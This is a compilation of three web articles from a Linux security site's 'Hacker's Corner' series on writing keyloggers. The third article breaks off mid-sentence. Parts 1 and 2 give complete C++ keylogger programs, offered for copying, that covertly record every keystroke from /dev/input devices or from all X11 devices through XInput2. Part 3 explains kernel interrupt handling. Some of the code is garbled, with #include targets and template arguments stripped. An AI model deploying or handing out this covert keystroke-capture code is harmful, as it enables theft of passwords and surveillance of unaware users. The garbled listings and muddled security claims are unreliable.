@@ -1,0 +1,1398 @@
+filename: complete-guide-to-keylogging-multif_20240507.txt
+https://linuxsecurity.com/features/complete-guide-to-keylogging-in-linux-part-1
+
+Hacker's Corner Keylogging Series Index
+
+Complete Guide to Keylogging
+     * Part 1: Intro to Keylogging
+     * Part 2: Linux GUI Stack
+     * Part 3: Linux Kernel & Keyboard
+
+Complete Guide to Anti-Debugging
+     * Part 1: Intro to Anti-Debugging
+     * Part 2: Self-Modifying Code
+     * Part 3: Breakpoints
+
+
+Hacker's Corner: Complete Guide to Keylogging in Linux - Part 1
+Apr 25, 2024
+
+   This first part of the Complete Guide to Keylogging in Linux will explore keylogger attacks in
+   network security. Keylogging can be valuable for testing within the Linux Security realm, so we will
+   dive deeper into how you can write keyloggers and read events directly from a keyboard device on
+   Linux.
+
+What is a Keylogger Attack?
+   Keyloggers refer to a computer program where you can covertly monitor keyboard inputs to ensure that
+   users are unaware of the activity you log. This program oversees lower-level keyboard events (key up
+   or down), and you can run the software anywhere from the Linux kernel space to the userspace,
+   depending on the design. This network security toolkit pays attention to what keys a user hits on the
+   keyboard, which can help cybercriminals determine login credentials, account information, and other
+   information.
+
+What is the Purpose of a Keylogger?
+   Business Cybersecurity IT security teams can use keyloggers during cloud security audit exercises (a
+   "red team" test) to determine what needs security patching on your server. They can also figure out
+   where cloud security breaches might try to compromise your system, infiltrate infrastructure, and
+   capture valuable data so they can take care of those gaps before it is too late. They can record
+   account credentials and network information to determine how to combat these risks.
+
+   Both offensive security teams, or red teams, and defensive security teams, or blue teams, can benefit
+   from keyloggers. Red teams can learn multiple ways to implement keyloggers and understand where
+   keyloggers can run within a server, whether through userspace, the hypervisor, or Linux kernels. Blue
+   teams can learn where keyloggers hide, and the standard APIs and methods employees must monitor to
+   detect keyloggers.
+
+What is the Main Function of a Keylogger on Linux Keyboards?
+
+   Here is a basic overview of how a keyboard fits in a larger scheme:
+        /-----------+-----------\   /-----------+-----------\
+        |   app 1   |    app 2  |   |   app 3   |    app 4  |
+        \-----------+-----------/   \-----------+-----------/
+                    ^                           ^
+                    |                           |
+            +-------+                           |
+            |                                   |
+            | key symbol              keycode   |
+            | + modifiers                       |
+            |                                   |
+            |                                   |
+        +---+-------------+         +-----------+-------------+
+        +     X server    |         |    /dev/input/eventX    |
+        +-----------------+         +-------------------------+
+                ^                               ^
+                |      keycode / scancode       |
+                +---------------+---------------+
+                                |
+                                |
+                +---------------+--------------+      interrupt
+                |           kernel             | <--------=-------+
+                +------------------------------+                  |
+                                                                  |
+    +----------+     USB, PS/2      +-------------+ PCI, ...   +-----+
+    | keyboard |------------------->| motherboard |----------->| CPU |
+    +----------+    key up/down     +-------------+            +-----+
+
+   In this example, a keyboard does not pass the ASCII code of pressed keys. Instead, it passes a unique
+   byte per key-down and key-up event, known as the key or scan code. When the key is released, it
+   passes through the scan code to the motherboard or connected interface, which will see if an event
+   takes place, which it can convert to an interrupt and move to the CPU. When the CPU sees the
+   interrupt, it will launch an interrupt handler, a keylogger code from the Linux kernel that registers
+   by populating the Interrupt Descriptor Table. This interrupt handler passes information to the
+   kernel, exposing the special path in devtmpfs (/dev/input/eventX).
+
+   In a GUI-based system, the X server takes these scan codes from the kernel and transforms them into
+   key symbols and metadata. With this layering, the Linux kernel can ensure the locale and keyboard map
+   settings are applied correctly, which can also be done without the X server. All GUI applications
+   receive events from the X server and then retrieve processed data.
+
+   You can write keyloggers in two different ways. Find the keyboard device /dev/input/eventX file and
+   read it directly, or ask the X server to pass the event data to us.
+
+How Can I Find the Keyboard Device?
+   Identifying the keyboard device is a relatively straightforward process:
+     * Iterate the "/dev/input/" across all files.
+     * Check the given file is a character device.
+     * Ensure the file supports key events and has keys found on keyboards.
+
+   Then, you can oversee a system with multiple keyboards and determine which devices are pretending to
+   be one (such as barcode scanners). This check can help you figure out what keys are supported. After,
+   read through and process the recorded data later to filter out unwanted devices. Then, you can
+   iterate over the directory and find the character files with C++17, as seen here:
+
+std::string get_kb_device() {
+	std::string kb_device = "";
+
+	for (auto &p : std::filesystem::directory_iterator("/dev/input/")) {
+		std::filesystem::file_status status = std::filesystem::status(p);
+
+		if (std::filesystem::is_character_file(status)) {
+			kb_device = p.path().string();
+		}
+	}
+	return kb_device;
+}
+
+   Check that the file is a keyboard and supports actual keys. However, this can be more involved, so
+   observe the scheme here:
+
+std::string filename = p.path().string();
+int fd = open(filename.c_str(), O_RDONLY);
+
+if (fd == -1) {
+	std::cerr << "Error: " << strerror(errno) << std::endl;
+	continue;
+}
+
+int32_t event_bitmap = 0;
+int32_t kbd_bitmap = KEY_A | KEY_B | KEY_C | KEY_Z;
+
+ioctl(fd, EVIOCGBIT(0, sizeof(event_bitmap)), &event_bitmap);
+
+if ((EV_KEY & event_bitmap) == EV_KEY) {
+	ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(event_bitmap)), &event_bitmap);
+	if ((kbd_bitmap & event_bitmap) == kbd_bitmap) {
+		// The device supports A, B, C, Z keys, so it probably is a keyboard
+		kb_device = filename;
+		close(fd);
+		break;
+	}
+
+}
+close(fd);
+
+How Can I Read Keyboard Events?
+   Here is how to read the events, which is a relatively straightforward process:
+     * Read the "input_event" from the keyboard device.
+     * Check that the event type is an EV_KEY, or key event.
+     * Interpret the fields and extract scan codes.
+     * Map scan codes to the name of the key.
+
+   Here is how to define the "input_event":
+
+struct input_event {
+#if (__BITS_PER_LONG != 32 || !defined(__USE_TIME_BITS64)) && !defined(__KERNEL__)
+	struct timeval time;
+#define input_event_sec time.tv_sec
+#define input_event_usec time.tv_usec
+#else
+	__kernel_ulong_t __sec;
+#if defined(__sparc__) && defined(__arch64__)
+	unsigned int __usec;
+	unsigned int __pad;
+#else
+	__kernel_ulong_t __usec;
+#endif
+#define input_event_sec  __sec
+#define input_event_usec __usec
+#endif
+	__u16 type;
+	__u16 code;
+	__s32 value;
+}
+
+   This is the terminology we must understand for the above example:
+     * "time" is the timestamp that informs you of the time the event occurred.
+     * "Type" defines the event based on the /usr/include/linux/input-event-codes.h.
+     * Key events will be under "**EV_KEY**"
+     * "Code" refers to the event code you find /usr/include/linux/input-event-codes.h. Key events will
+       be scan codes.
+     * "Value" refers to the value of the carried event. This can be either a relative change for
+       EV_REL, an absolute new value for EV_ABS (joysticks, etc.), or 0 for EV_KEY for release, 1 for
+       keypress and 2 for autorepeat.
+
+   Use the following map to run key name scan codes in a basic format:
+
+std::vector keycodes = {
+        "RESERVED",
+        "ESC",
+        "1",
+        "2",
+        "3",
+        "4",
+        "5",
+        "6",
+        "7",
+        "8",
+        "9",
+        "0",
+        "MINUS",
+        "EQUAL",
+        "BACKSPACE",
+        "TAB",
+        "Q",
+        "W",
+        "E",
+        "R",
+        "T",
+        "Y",
+        "U",
+        "I",
+        "O",
+        "P",
+        "LEFTBRACE",
+        "RIGHTBRACE",
+        "ENTER",
+        "LEFTCTRL",
+        "A",
+        "S",
+        "D",
+        "F",
+        "G",
+        "H",
+        "J",
+        "K",
+        "L",
+        "SEMICOLON",
+        "APOSTROPHE",
+        "GRAVE",
+        "LEFTSHIFT",
+        "BACKSLASH",
+        "Z",
+        "X",
+        "C",
+        "V",
+        "B",
+        "N",
+        "M",
+        "COMMA",
+        "DOT",
+        "SLASH",
+        "RIGHTSHIFT",
+        "KPASTERISK",
+        "LEFTALT",
+        "SPACE",
+        "CAPSLOCK",
+        "F1",
+        "F2",
+        "F3",
+        "F4",
+        "F5",
+        "F6",
+        "F7",
+        "F8",
+        "F9",
+        "F10",
+        "NUMLOCK",
+        "SCROLLLOCK"
+};
+
+   Here is the complete keylogger code for you to copy if needed:
+
+#include
+#include
+#include
+#include
+#include
+
+#include <sys/stat.h>
+#include <linux/input.h>
+
+#include
+
+#include
+#include
+#include
+#include
+
+std::vector keycodes = {
+		"RESERVED",
+		"ESC",
+		"1",
+		"2",
+		"3",
+		"4",
+		"5",
+		"6",
+		"7",
+		"8",
+		"9",
+		"0",
+		"MINUS",
+		"EQUAL",
+		"BACKSPACE",
+		"TAB",
+		"Q",
+		"W",
+		"E",
+		"R",
+		"T",
+		"Y",
+		"U",
+		"I",
+		"O",
+		"P",
+		"LEFTBRACE",
+		"RIGHTBRACE",
+		"ENTER",
+		"LEFTCTRL",
+		"A",
+		"S",
+		"D",
+		"F",
+		"G",
+		"H",
+		"J",
+		"K",
+		"L",
+		"SEMICOLON",
+		"APOSTROPHE",
+		"GRAVE",
+		"LEFTSHIFT",
+		"BACKSLASH",
+		"Z",
+		"X",
+		"C",
+		"V",
+		"B",
+		"N",
+		"M",
+		"COMMA",
+		"DOT",
+		"SLASH",
+		"RIGHTSHIFT",
+		"KPASTERISK",
+		"LEFTALT",
+		"SPACE",
+		"CAPSLOCK",
+		"F1",
+		"F2",
+		"F3",
+		"F4",
+		"F5",
+		"F6",
+		"F7",
+		"F8",
+		"F9",
+		"F10",
+		"NUMLOCK",
+		"SCROLLLOCK"
+};
+
+int loop = 1;
+
+void sigint_handler(int sig) {
+	loop = 0;
+}
+
+int write_all(int file_desc, const char *str) {
+	int bytesWritten = 0;
+	int bytesToWrite = strlen(str);
+
+	do {
+		bytesWritten = write(file_desc, str, bytesToWrite);
+
+		if (bytesWritten == -1) {
+			return 0;
+		}
+
+		bytesToWrite -= bytesWritten;
+		str += bytesWritten;
+
+	} while(bytesToWrite > 0);
+
+	return 1;
+}
+
+void safe_write_all(int file_desc, const char *str, int keyboard) {
+	struct sigaction new_actn, old_actn;
+	new_actn.sa_handler = SIG_IGN;
+	sigemptyset(&new_actn.sa_mask);
+	new_actn.sa_flags = 0;
+
+	sigaction(SIGPIPE, &new_actn, &old_actn);
+
+	if (!write_all(file_desc, str)) {
+		close(file_desc);
+		close(keyboard);
+		std::cerr << "Error: " << strerror(errno) << std::endl;
+		exit(1);
+	}
+
+	sigaction(SIGPIPE, &old_actn, NULL);
+}
+
+void keylogger(int keyboard, int writeout) {
+	int eventSize = sizeof(struct input_event);
+	int bytesRead = 0;
+	const unsigned int number_of_events = 128;
+	struct input_event events[number_of_events];
+	int i;
+
+	signal(SIGINT, sigint_handler);
+
+	while(loop) {
+		bytesRead = read(keyboard, events, eventSize * number_of_events);
+
+		for(i = 0; i < (bytesRead / eventSize); ++i) {
+			if (events[i].type == EV_KEY) {
+				if (events[i].value == 1) {
+					if (events[i].code > 0 && events[i].code < keycodes.size()) {
+						safe_write_all(writeout, keycodes[events[i].code].c_str(), keyboard);
+						safe_write_all(writeout, "\n", keyboard);
+					} else {
+						write(writeout, "UNRECOGNIZED", sizeof("UNRECOGNIZED"));
+					}
+				}
+			}
+		}
+	}
+	if (bytesRead > 0) safe_write_all(writeout, "\n", keyboard);
+}
+
+std::string get_kb_device() {
+	std::string kb_device = "";
+
+	for (auto &p : std::filesystem::directory_iterator("/dev/input/")) {
+		std::filesystem::file_status status = std::filesystem::status(p);
+
+		if (std::filesystem::is_character_file(status)) {
+			std::string filename = p.path().string();
+			int fd = open(filename.c_str(), O_RDONLY);
+			if (fd == -1) {
+				std::cerr << "Error: " << strerror(errno) << std::endl;
+				continue;
+			}
+
+			int32_t event_bitmap = 0;
+			int32_t kbd_bitmap = KEY_A | KEY_B | KEY_C | KEY_Z;
+
+			ioctl(fd, EVIOCGBIT(0, sizeof(event_bitmap)), &event_bitmap);
+
+			if ((EV_KEY & event_bitmap) == EV_KEY) {
+				// The device acts like a keyboard
+
+				ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(event_bitmap)), &event_bitmap);
+
+				if ((kbd_bitmap & event_bitmap) == kbd_bitmap) {
+					// The device supports A, B, C, Z keys, so it probably is a keyboard
+					kb_device = filename;
+					close(fd);
+					break;
+				}
+			}
+			close(fd);
+		}
+	}
+	return kb_device;
+}
+
+void print_usage_and_quit(char *application_name) {
+	std::cout << "Usage: " << application_name << " output-file" << std::endl;
+	exit(1);
+}
+
+int main(int argc, char *argv[]) {
+	std::string kb_device = get_kb_device();
+
+	if (argc < 2)
+		print_usage_and_quit(argv[0]);
+
+	if (kb_device == "")
+		print_usage_and_quit(argv[0]);
+
+	int writeout;
+	int keyboard;
+
+	if ((writeout = open(argv[1], O_WRONLY|O_APPEND|O_CREAT, S_IROTH)) < 0) {
+		std::cerr << "Error opening file " << argv[1] << ": " << strerror(errno) << std::endl;
+		return 1;
+	}
+
+	if ((keyboard = open(kb_device.c_str(), O_RDONLY)) < 0) {
+		std::cerr << "Error accessing keyboard from " << kb_device << ". May require you to be superuser." \
+		<< std::endl;
+		return 1;
+	}
+
+	std::cout << "Keyboard device: " << kb_device << std::endl;
+	keylogger(keyboard, writeout);
+
+	close(keyboard);
+	close(writeout);
+
+	return 0;
+}
+
+
+Final Thoughts on Linux Keylogger Attacks
+   Exercise proper data and network security by implementing proper key press and release entries that
+   handle backspaces and patch cybersecurity vulnerabilities. These network security toolkits can help
+   improve security posture and allow users the peace of mind that they will not face keylogger cloud
+   security breaches.
+
+
+---
+https://linuxsecurity.com/features/complete-guide-to-keylogging-in-linux-part-2
+
+Hacker's Corner: Complete Guide to Keylogging in Linux - Part 2
+Apr 24, 2024
+
+   In Complete Guide to Keylogging in Linux: Part 1, we discussed how to write keyloggers for Linux
+   by reading keyboard device events. This article will continue to discuss keyboard event capture so
+   you have more techniques to use for keylogger attacks in network security.
+
+What is the Linux GUI Stack?
+   On Operating Systems (OSes) like Windows, the Graphical User Interface (GUI) is a part of the setup.
+   However, Linux OSes do not have GUI built into them. Instead, a stack of applications, libraries, and
+   protocols manages the GUI. Here is what a generic stack looks like:
+    +---------------+                                      +--------------+
+    |   Display:2   |<--=---+                    +----=--->|   WxWidget   |-----+
+    +---------------+       |                    |         +--------------+     |
+                            |                    |                              |
+    +---------------+       |                    |         +--------------+     |
+    |   Display:1   |<--=---+                    +----=--->|      Qt      |-----+
+    +---------------+       |                    |         +--------------+     |
+                            |                    |                              |
+    +---------------+       |                    |         +--------------+     |
+    |   Display:0   |<--=---+                    +----=--->|     GTK+     |-----+
+    +---------------+       |                    |         +--------------+     |
+                            |                    |                              |
+                            |                    |                              |
+     update   +-------------+--+  ---=---> +-----+--------+   send data         |
+    +------=--|    X Server    |           |     xlib     |<-------------=------+
+    | screen  +----------------+  <--=---- +--------------+   ask to repaint
+    |             ^
+    |             | events
+    |   +---------+----------------+
+    +-->|       Linux Kernel       |
+        +--------------------------+
+
+
+
+   Within a stack, an X server sits between a GUI and OS while providing various primitives as a part of
+   its responsibilities. The X server implements the "windows, icons, menus, pointer" paradigm in a
+   network-oriented protocol that allows you to draw a screen on a different system from where you run
+   the application. This stack is extensible by design because the GUI network security toolkits use
+   various server libraries and their controls. The GUI network security toolkits (GTK, GTK+, Qt) are
+   found in the "user-friendly" functions, so employees can take these applications and design them
+   according to their own UI needs. Some Desktop Environments with traditional elements and controls
+   (launchers, wallpapers, drag and drop) will run these applications.
+
+What X Server Terminology Should I Know?
+   Server Security Let's review a few non-intuitive terms that X servers utilize:
+     * **display** refers to any X server.
+     * **screen** is a virtual framebuffer that associates itself with a display, which can have more
+       than one screen.
+     * **monitor** demonstrates where the framebuffer on your physical monitor will be drawn. A screen
+       usually maps with one monitor, but it can also have two monitors on the same screen. These
+       displays can offer a mirror view or a huge screen over two smaller monitors.
+     * **root window** is the window where everything is drawn, and it serves as the root node of the
+       window tree.
+     * **virtual core device** refers to the mouse and keyboard on a server. These master devices are
+       not dependent on the presence of physical input devices, and they do not generate independent
+       events. Master devices provide core events in a range that matches display resolution and
+       generates device-specific resolution events. Clients receive events once enrolled in XInput
+       Extension, and they can open physical devices directly for non-core events.
+
+How Does Keylogging Work in an X Server?
+   Here are a few of the basic ways that you can summarize an input capture:
+     * Check if the X server is running
+     * Enumerate available displays
+     * Open desired display
+     * Check if XInputExtension is available
+     * Set event mask to enable key press and key release events
+     * Read events from display in loop
+
+How Can I Enumerate Displays?
+   When the X server runs, it creates socket files in "/tmp/.X11-unix/" by convention for each display.
+   File names follow common patterns with "X<digits>" while ":<digits>" will be the display name.
+   Enumerate this path and open available displays to ensure each socket file is from your X server.
+   Here is the sample code for enumeration:
+
+std::vector<std::string> EnumerateDisplay() {
+std::vector<std::string> displays;
+
+	for (auto &p : std::filesystem::directory_iterator("/tmp/.X11-unix")) {
+		std::string path = p.path().filename().string();
+		std::string display_name = ":";
+
+		if (path[0] != 'X') continue;
+
+		path.erase(0, 1);
+		display_name.append(path);
+
+		Display *disp = XOpenDisplay(display_name.c_str());
+
+		if (disp != NULL) {
+		int count = XScreenCount(disp);
+		printf("Display %s has %d screens\n",
+			display_name.c_str(), count);
+
+		int i;
+		for (i=0; i<count; i++)
+			printf(" %d: %dx%d\n",
+			i, XDisplayWidth(disp, i), XDisplayHeight(disp, i));
+
+		XCloseDisplay(disp);
+
+		displays.push_back(display_name);
+		}
+	}
+
+	return displays;
+}
+
+   We can enumerate screens and dimensions for each detected display. In this example, we can see the
+   one screen with 1920x1080 dimensions:
+
+Display :0 has 1 screens
+ 0: 1920x1080
+
+How Can I Detect XInputExtension?
+   Use "XQueryExtension" to see if there are any available extensions on a selected display. Exchanges
+   may change their behavior in the future, so limit use to specific versions where we have tested the
+   code to prevent network security issues. In this example, we will stick with the 2.0 version of
+   XInputExtension for the code snippet:
+
+// Set up X
+Display * disp = XOpenDisplay(hostname);
+
+if (NULL == disp) {
+	std::cerr << "Cannot open X display: " << hostname << std::endl;
+	exit(1);
+}
+
+// Test for XInput 2 extension
+int xiOpcode, queryEvent, queryError;
+
+if (! XQueryExtension(disp, "XInputExtension", &xiOpcode, &queryEvent, &queryError)) {
+	std::cerr << "X Input extension not available" << std::endl;
+	exit(2);
+}
+
+// Request XInput 2.0, guarding against changes in future versions
+int major = 2, minor = 0;
+int queryResult = XIQueryVersion(disp, &major, &minor);
+
+if (queryResult == BadRequest) {
+	std::cerr << "Need XI 2.0 support (got " << major << "." << minor << std::endl;
+	exit(3);
+} else if (queryResult != Success) {
+	std::cerr << "Internal error" << std::endl;
+	exit(4);
+}
+
+How Do I Register for Events?
+   You will need to use masks and binaries that take the form of (1 << event type). Set a mask to get
+   specific events from an X server so you can see which ones you would be interested in:
+
+typedef struct {
+	int deviceid;
+	int mask_len;
+	unsigned char* mask;
+} XIEventMask;
+
+   If a device has a valid device ID, the event mask will only be on one device. However, if the device
+   ID detects XIAllDevices or XIAllMasterDevices, the event mask will select all or all the master
+   devices on a system. This bit-wise event mask is effective for dealing with resulting network
+   security threats. The mask_len specifies the bytes of the mask length. Set your mask with the
+   following configurations:
+
+Window root = DefaultRootWindow(disp);
+
+XIEventMask m;
+m.deviceid = XIAllMasterDevices;
+m.mask_len = XIMaskLen(XI_LASTEVENT);
+m.mask = (unsigned char*)calloc(m.mask_len, sizeof(char));
+XISetMask(m.mask, XI_RawKeyPress);
+XISetMask(m.mask, XI_RawKeyRelease);
+
+XISelectEvents(disp, root, &m, 1);
+XSync(disp, false);
+free(m.mask);
+
+How Can I Read Events?
+   Perform a loop with the following actions so you can read the events. Take an event using
+   "XNextEvent()." Verify the field values to ensure that the event is intended. Here is the code for
+   this loop:
+
+typedef struct {
+	int type;
+	unsigned long serial;
+	Bool send_event;
+	Display *display;
+	int extension;
+	int evtype;
+	unsigned int cookie;
+	void *data;
+} XGenericEventCookie;
+
+while (true) {
+	XEvent event;
+	XGenericEventCookie *cookie = (XGenericEventCookie*)&event.xcookie;
+	XNextEvent(disp, &event);
+
+	if (XGetEventData(disp, cookie) &&
+		cookie->type == GenericEvent &&
+		cookie->extension == xiOpcode)
+	{
+		switch (cookie->evtype) {
+			case XI_RawKeyRelease:
+			case XI_RawKeyPress:
+			{
+				XIRawEvent *ev = (XIRawEvent*)cookie->data;
+
+				// Ask X what it calls that key
+				KeySym s = XkbKeycodeToKeysym(disp, ev->detail, 0, 0);
+				if (NoSymbol == s) continue;
+				char *str = XKeysymToString(s);
+				if (NULL == str) continue;
+
+				std::cout << (cookie->evtype == XI_RawKeyPress ? "+" : "-") << str << " " << std::flush;
+				break;
+			}
+		}
+	}
+}
+
+   We don't need to map scan codes within this code, unlike in our previous post, when we had to input
+   the keys manually for keylogger codes. Let the X server do the heavy lifting with applicable keyboard
+   layouts and scan code mapping on current layouts.
+
+What is the Complete Code?
+   Below is the whole code to copy and use the entire code for experimenting and testing.
+
+Final Thoughts on Keylogging in Linux
+   Keylogging on Linux is a helpful way to ensure data and network security on your server. Learn how to
+   implement GUI stacks and X server protocols into your system to improve security posture. Read
+   Part 3 of this series next to learn more about keylogging in Linux.
+
+keylogger.cpp
+
+#include <X11/XKBlib.h>
+#include <X11/extensions/XInput2.h>
+
+#include
+
+#include
+#include
+#include
+#include
+#include
+
+int printUsage(std::string application_name) {
+	std::cout << "USAGE: " << application_name << " [-display ] [-enumerate] [-help]" << std::endl;
+	std::cout << "display      target X display                   (default :0)" << std::endl;
+	std::cout << "enumerate    enumerate all X11 displays" << std::endl;
+	std::cout << "help         print this information and exit" << std::endl;
+
+	exit(0);
+}
+
+std::vector EnumerateDisplay() {
+	std::vector displays;
+
+	for (auto &p : std::filesystem::directory_iterator("/tmp/.X11-unix")) {
+		std::string path = p.path().filename().string();
+		std::string display_name = ":";
+
+		if (path[0] != 'X') continue;
+
+		path.erase(0, 1);
+		display_name.append(path);
+
+		Display *disp = XOpenDisplay(display_name.c_str());
+
+		if (disp != NULL) {
+			int count = XScreenCount(disp);
+			printf("Display %s has %d screens\n",
+					display_name.c_str(), count);
+
+			int i;
+			for (i=0; i<count; i++)
+				printf(" %d: %dx%d\n",
+						i, XDisplayWidth(disp, i), XDisplayHeight(disp, i));
+
+			XCloseDisplay(disp);
+
+			displays.push_back(display_name);
+		}
+	}
+
+	return displays;
+}
+
+int main(int argc, char * argv[]) {
+	const char * hostname    = ":0";
+
+	// Get arguments
+	for (int i = 1; i < argc; i++) {
+		if (!strcmp(argv[i], "-help"))
+			printUsage(argv[0]);
+		else if (!strcmp(argv[i], "-display"))
+			hostname    = argv[++i];
+		else if (!strcmp(argv[i], "-enumerate"))
+		{
+			EnumerateDisplay();
+			return 0;
+		} else {
+			std::cerr << "Unknown argument: " << argv[i] << std::endl;
+			printUsage(argv[0]);
+		}
+	}
+
+	// Set up X
+	Display * disp = XOpenDisplay(hostname);
+	if (NULL == disp) {
+		std::cerr << "Cannot open X display: " << hostname << std::endl;
+		exit(1);
+	}
+
+	// Test for XInput 2 extension
+	int xiOpcode, queryEvent, queryError;
+
+	if (! XQueryExtension(disp, "XInputExtension", &xiOpcode, &queryEvent, &queryError)) {
+		std::cerr << "X Input extension not available" << std::endl;
+		exit(2);
+	}
+
+	{ // Request XInput 2.0, guarding against changes in future versions
+		int major = 2, minor = 0;
+		int queryResult = XIQueryVersion(disp, &major, &minor);
+		if (queryResult == BadRequest) {
+			std::cerr << "Need XI 2.0 support (got " << major << "." << minor << std::endl;
+			exit(3);
+		} else if (queryResult != Success) {
+			std::cerr << "Internal error" << std::endl;
+			exit(4);
+		}
+	}
+
+	// Register events
+	Window root = DefaultRootWindow(disp);
+
+	XIEventMask m;
+	m.deviceid = XIAllMasterDevices;
+	m.mask_len = XIMaskLen(XI_LASTEVENT);
+	m.mask = (unsigned char*)calloc(m.mask_len, sizeof(char));
+	XISetMask(m.mask, XI_RawKeyPress);
+	XISetMask(m.mask, XI_RawKeyRelease);
+
+	XISelectEvents(disp, root, &m, 1);
+	XSync(disp, false);
+	free(m.mask);
+
+	while (true) {
+		XEvent event;
+		XGenericEventCookie *cookie = (XGenericEventCookie*)&event.xcookie;
+		XNextEvent(disp, &event);
+
+		if (XGetEventData(disp, cookie) &&
+				cookie->type == GenericEvent &&
+				cookie->extension == xiOpcode)
+		{
+			switch (cookie->evtype) {
+				case XI_RawKeyRelease:
+				case XI_RawKeyPress:
+				{
+					XIRawEvent *ev = (XIRawEvent*)cookie->data;
+
+					// Ask X what it calls that key
+					KeySym s = XkbKeycodeToKeysym(disp, ev->detail, 0, 0);
+					if (NoSymbol == s) continue;
+					char *str = XKeysymToString(s);
+					if (NULL == str) continue;
+
+					std::cout << (cookie->evtype == XI_RawKeyPress ? "+" : "-") << str << " " << std::flush;
+					break;
+				}
+			}
+		}
+	}
+}
+
+
+
+---
+https://linuxsecurity.com/features/complete-guide-to-keylogging-in-linux-part-3
+
+Hacker's Corner: Complete Guide to Keylogging in Linux - Part 3
+
+   In Complete Guide to Keylogging in Linux: Part 1 and Complete Guide to Keylogging in Linux:
+   Part 2, we discussed the basics of keylogging and a few options you can utilize to check your server
+   for attacks in network security. This article will discuss what techniques you can implement to
+   capture keyboard events within a Linux kernel.
+
+What is the Linux Kernel Responsible For?
+   A kernel is responsible for setting up interrupt handlers, which the Linux kernel does by populating
+   the Interrupt Descriptor Table and passing it to the CPU. The CPU then understands what routine to
+   perform. Kernels provide a keyboard notification system that accepts **notifier_block** objects from
+   other Linux Security modules and corresponds with callbacks within all keyboard events. Here is a
+   detailed diagram of keyboard handling:
+
+    +---------------------+             +-----------+  (2)  +----------+
+    |     USER LAND       |             | Interrupt | ----->| Keyboard |
+    +---------------------+   +--=----->|  Handler  |<----- | Notifier |
+                   ^          |         +-------+---+  (3)  +----------+
+       keycode /   |          |                 |
+     scancode      |          |                 |
+               (5) |          |(1)              |(4)
+                   |          |                 |
+                   |          |                 |
+                +--+----------+--+              |
+                |                |<--------=----+
+                |     KERNEL     |                      Interrupt
+                |                |<---------=---------------------+
+                +----------------+                                |
+                                                                  |
+    +----------+     USB, PS/2      +-------------+ PCI, ...   +-----+
+    | keyboard |------------------->| motherboard |----------->| CPU |
+    +----------+    key up/down     +-------------+            +-----+
+
+
+What Is an Interrupt?
+   Interrupts are events that alter the execution flows of normal programming. Hardware devices and CPUs
+   can generate these interrupts. We divide interrupts into two categories: synchronous, or generation
+   through instruction execution, and asynchronous, or generation by external events. Users can see
+   interrupts classified in other forms, such as maskable, which means the interrupt can be ignored or
+   signaled through INT pins, and non-maskable, which cannot be overlooked and are signaled through NMI
+   pins.
+
+How Do Interrupts Work at the Hardware Level?
+   The CPU and interrupt devices generally do not connect. Instead, the hardware uses Programmable
+   Interrupt Controllers (PICs) to supply the CPU with interrupts from multiple devices by converting
+   them to a suitable format. Here is what the programming looks like:
+    +-------------+
+    |             |     NMI
+    |             |<---------------    |             |
+    |     CPU     |                 +-------------+    irq 0
+    |             |     INTR        |             |<----------- Device 0
+    |             |<----------------+             |    irq 1
+    |             |                 |             |<----------- Device 1
+    +-------------+                 |     PIC     |
+                                    |             |    irq N
+                                    |             |<----------- Device N
+                                    |             |
+                                    +-------------+
+
+
+   PIC-to-CPU communication is generally not the most productive. Therefore, we utilize Advanced
+   Programmable Interrupt Controllers (APICs) combined with local APICs to see locally connected
+   devices, including thermal sensors and timers, in action. Here is what the configuration looks like:
+
+           |                               |                               |
+           | Local                         | Local                         | Local
+           | IRQ                           | IRQ                           | IRQ
+           |                               |                               |
+           |                               |                               |
+    +------+------+                 +------+------+                 +------+------+
+    |             |                 |             |                 |             |
+    |             |                 |             |                 |             |
+    |             |                 |             |                 |             |
+    |    CPU 0    |                 |    CPU 1    |                 |    CPU N    |
+    |             |                 |             |                 |             |
+    |             |                 |             |                 |             |
+    | local APIC  |                 | local APIC  |                 | local APIC  |
+    +-------------+                 +-------------+                 +-------------+
+          ^^                              ^^                              ^^
+          || INT                          || INT                          || INT
+          ||                              ||                              ||
+          || 0-N                          || 0-N                          || 0-N
+          ||                              ||                              ||
+          vv                              vv                              vv
+    +-----------------------------------------------------------------------------+
+    |                  Interrupt Controller Communication Bus                     |
+    +-----------------------------------------------------------------------------+
+                                           ^
+                                           |
+                                           |
+                                           |
+                External        +----------+--------+
+            ------------------->|      I/O APIC     |
+                Interrupts      +-------------------+
+
+
+   External devices are interfaced with I/O APIC, which takes interrupts from them, and passes to some
+   CPU core (depending upon how IRQs are scheduled) to handle it. This happens in roughly following
+   manner:
+
+   - Some device raises IRQ pin to trigger interrupt.
+   - APIC converts the IRQ into a vector number and writes it to a port for CPU core to read
+   - APIC raises an interrupt on INTR pin
+   - APIC waits for CPU to acknowledge an interrupt
+   - CPU handles the interrupt (or maybe drops/ignores it).
+
+How Do Interrupts Work at the Software Level?
+   Linux Software Security2 We limit ourselves to handling interrupts on our CPU rather than handling
+   the interrupts at the device or APIC levels. We start the procedure by checking current execution
+   privileges and switching them as needed. For example, we might need to stack with required privileges
+   or copy them into a new stack. Then, we will take a backup of the CPU states to utilize context
+   switching across registers and error codes to adjust the context if necessary. The CPU will look into
+   the IDTW register and find the IDT's location. After, it will use the interrupt vector number as a
+   key for finding start addresses for corresponding handlers with the jump table, and they will then
+   take care of translations. Finally, the CPU will execute the interrupt handler, return from the
+   interrupt handler (IRET), restore the registers and error codes, and switch to previous privileges.
+
+   Linux typically handles interrupts through three phases, though not all interrupt handlers will have
+   all of these phases:
+    1. The kernel disables local interrupts and acknowledges the request. Then, the kernel runs a
+       generic interrupt handler to determine the interrupt number and handler for this particular
+       interrupt and controller. This scanning helps us determine if an interrupt request is across
+       multiple devices, known as a shared interrupt.
+    2. Linux will execute any associated handlers from corresponding device drivers. The software then
+       calls an "end of interrupt" for the chain so they can re-assert control with the interrupt
+       controller.
+    3. The Linux kernel enables the local interrupt processors and executes deferred interrupt context
+       actions.
+
+   Deferred functions can help run callback functions later in the process. If you can schedule
+   deferrable actions from the interrupt handler, associated callback functions run once the interrupt
+   handler completes.
+
+What is a Keyboard Notifier?
+   A keyboard notifier focuses on contacting callbacks to pass data in **keyboard_notifier_param**
+   formats. Here is what they look like:
+
+struct keyboard_notifier_param {
+	struct vc_data *vc;
+	int down;
+	int shift;
+	int ledstate;
+	unsigned int value;
+};
+
+   Keyboard notifiers focus on providing a virtual console for each keyboard event. Press 1 for a key
+   press event or 0 for a key release. The shift is the current modifier state, and the mask bit indexes
